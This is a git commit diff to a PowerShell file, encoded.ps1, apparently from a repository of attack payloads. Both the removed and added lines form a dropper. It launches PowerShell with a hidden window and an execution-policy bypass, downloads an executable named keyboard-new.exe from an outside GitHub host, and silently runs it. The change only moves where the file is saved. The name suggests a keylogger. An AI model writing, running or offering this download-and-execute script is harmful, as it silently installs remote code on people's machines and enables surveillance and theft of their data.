5d71c04b636283edf24262b8f49457469e89edd5
rude90 <115774095+rude90@users.noreply.github.com>
2023-11-03 21:14:23 +0500

    Update encoded.ps1

--- encoded.ps1
+++ encoded.ps1
@@ -1,2 +1,2 @@
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/keyboard-new.exe -o C:\Users\runtime.exe
-powershell.exe -w Hidden C:\Users\runtime.exe
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/keyboard-new.exe -o C:\Users\Public\runtime.exe
+powershell.exe -w Hidden C:\Users\Public\runtime.exe
